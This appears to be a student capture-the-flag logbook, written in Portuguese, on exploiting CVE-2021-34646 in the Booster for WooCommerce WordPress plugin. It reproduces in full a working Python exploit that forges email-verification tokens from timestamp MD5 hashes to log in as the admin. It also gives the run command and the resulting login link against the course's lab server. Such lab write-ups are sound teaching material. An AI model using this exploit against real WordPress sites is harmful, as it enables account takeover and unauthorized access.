# LOGBOOK3 - Wordpress CVE

### Reconhecimento - Informações encontradas após utilizar o website
- **Versão do WordPress** - 5.8.1
  <br>
- **Plugins instalados e versões dos mesmos**:
    - WooCommerce plugin - 5.7.1
    - Booster for WooCommerce plugin - 5.4.3
      <br>
- **Possíveis utilizadores e nomes de utilizadores**:
    - admin
    - Orval Sanford

### Pesquisa por vulnerabilidades - Utilização de uma base de dados para descobrir a CVE
Utilizamos o website [Exploit Database](https://www.exploit-db.com) para descobrir com que vulnerabilidade estávamos a lidar e descobrimos que era a **CVE-2021-34646**.

Assim foi possível encontrar um script de python que era capaz de dar exploit a esta vulnerabilidade:
>1:
>Goto: https://target.com/wp-json/wp/v2/users/
>Pick a user-ID (e.g. 1 - usualy is the admin)
>
>2:
Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
>
>3:
>Check-Out  out which of the generated links allows you to access the system
>
>import requests,sys,hashlib
> 
>import argparse
> 
>import datetime
> 
>import email.utils
> 
>import calendar
> 
>import base64
>
>B = "\033[94m"
> 
>W = "\033[97m"
> 
>R = "\033[91m"
> 
>RST = "\033[0;0m"
>
>parser = argparse.ArgumentParser()
> 
>parser.add_argument("url", help="the base url")
> 
>parser.add_argument('id', type=int, help='the user id', default=1)
> 
>args = parser.parse_args()
> 
>id = str(args.id)
> 
>url = args.url
> 
>if args.url[-1] != "/": # URL needs trailing /
> 
>url = url + "/"
>
>verify_url= url + "?wcj_user_id=" + id
> 
>r = requests.get(verify_url)
>
>if r.status_code != 200:
> 
>print("status code != 200")
> 
>print(r.headers)
> 
>sys.exit(-1)
>
>def email_time_to_timestamp(s):
> 
>tt = email.utils.parsedate_tz(s)
> 
>if tt is None: return None
> 
>return calendar.timegm(tt) - tt[9]
>
>date = r.headers["Date"]
> 
>unix = email_time_to_timestamp(date)
>
>def printBanner():
> 
>print(f"{W}Timestamp: {B}" + date)
> 
> 
>print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
> 
>print("We need to generate multiple timestamps in order to avoid delay related timing errors")
> 
>print("One of the following links will log you in...\n")
>
>printBanner()
> 
>for i in range(3): # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
>
>hash = hashlib.md5(str(unix-i).encode()).hexdigest()
>
>print(f"{W}#" + str(i) + f" link for hash {R}"+hash+f"{W}:")
>
>token='{"id":"'+ id +'","code":"'+hash+'"}'
>
>token = base64.b64encode(token.encode()).decode()
>
>token = token.rstrip("=") # remove trailing =
>
>link = url+"my-account/?wcj_verify_email="+token
>
>print(link + f"\n{RST}")


De forma a conseguirmos utilizar este script temos de o correr utilizando este comando './exploit_CVE-2021-34646.py https://target.com/ 1' que neste caso seria './50299.py http://ctf-fsi.fe.up.pt:5001 1', sendo o segundo elemento o link para o website e o terceiro elemento o id do utilizador ao qual conta queremos aceder (admin id = 1).

Com isto são gerados três links que nos permitem aceder a certas contas. Utilizando o link 'http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiOWEwYzQ3MzcwZGY5ODBhNDU5NTYwYWIzYTUxNTI0NGYifQ', somos redirecionados para o mesmo website mas desta vez estando dentro da conta de um admin. Ai conseguimos aceder a uma mensagem privada aonde é mencionada a flag:

**flag{please don't bother me}**

